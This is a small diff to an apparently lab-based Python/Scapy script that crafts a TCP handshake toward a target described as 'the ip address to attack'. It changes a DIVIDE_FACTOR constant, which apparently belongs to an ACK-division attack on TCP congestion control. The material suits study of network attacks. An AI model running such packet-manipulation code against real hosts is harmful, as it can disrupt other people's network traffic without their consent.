@@ -14,7 +14,7 @@ parser.add_argument('--sport', default=8000, type=int, help='The port to send th
 parser.add_argument('--host', default='127.0.0.1', type=str, help='The ip address to attack.')
 args = parser.parse_args()
 
-DIVIDE_FACTOR = 5
+DIVIDE_FACTOR = 2
 
 if __name__ == "__main__":
    
@@ -26,7 +26,7 @@ if __name__ == "__main__":
     syn = ip_header / TCP(sport=args.sport, dport=args.dport, flags='S', seq=seq_no) # Construct a SYN packet.
     synack = sr1(syn) # Send the SYN packet and recieve a SYNACK
 
-    ack = ip_header / TCP(sport=args.sport, dport=args.dport, flags='A', ack=synack.seq + 1, seq=(seq_no + 1)) # ACK the SYNACK
+    ack = ip_header / TCP(sport=args.sport, dport=args.dport, flags='A', ack=(synack.seq + 1), seq=(seq_no + 1)) # ACK the SYNACK
 
     socket = conf.L2socket(iface='client-eth0')
     def handle_packet(data):
